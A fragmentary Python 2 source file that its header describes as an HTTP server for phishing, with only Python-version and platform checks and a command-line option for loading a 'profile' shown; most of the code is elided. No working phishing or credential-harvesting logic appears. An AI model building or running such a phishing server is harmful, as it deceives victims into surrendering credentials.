#!/usr/bin/env python2
#
# Shaytana_L_Bare2a.py - HTTP server for phishing
#
...
#
# Copyright (C) 2020 viviane <hsynayb6@gmail.com>
#
...
def tests_pyver():
    if sys.version[:3] == "2.7" or "2" in sys.version[:3]:
        ...
        printt(1,"Shaytana_L_Bare2a has no support for Python 3.")
    else:
        printt(1, "Your Python version is very old ..")

def tests_platform():
    if "linux" in sys.platform:
        #printt(3, "Running Shaytana_L_Bare2a on linux ... (All good)")
        pass
    elif "darwin" in sys.platform:
        #printt(3, "Running Shaytana_L_Bare2a on \'Mac\' (All good)")
        pass
    elif "win" in sys.platform:
        print("Sorry, there is no support for windows right now.")
        sys.exit(1)
    else:
        printt(3, "If \'Shaytana_L_Bare2a\' runs sucsessfuly on your platform %s\nPlease let me (@viviane) know!" %sys.platform)
...
def main():
    ...
    parser.add_option("-p", "--profile", dest="profile", help="Load Shaytana_L_Bare2a profile.")
